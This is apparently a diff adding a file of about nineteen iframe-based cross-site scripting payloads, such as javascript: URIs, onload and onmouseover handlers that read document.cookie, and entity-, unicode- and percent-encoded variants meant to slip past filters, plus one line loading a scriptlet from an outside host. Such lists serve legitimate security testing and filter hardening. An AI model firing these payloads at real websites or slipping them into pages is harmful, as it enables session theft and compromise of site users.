@@ -1,1 +1,19 @@
-
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<IFRAME width="420" height="315" frameborder="0" onload="alert(document.cookie)"></IFRAME>
+<iframe src=http://xss.rocks/scriptlet.html <
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<iframe// src=javaSCRIPT&colon;alert(1)
+<iframe/src \/\/onload = prompt(1)
+<iframe/onreadystatechange=alert(1)
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
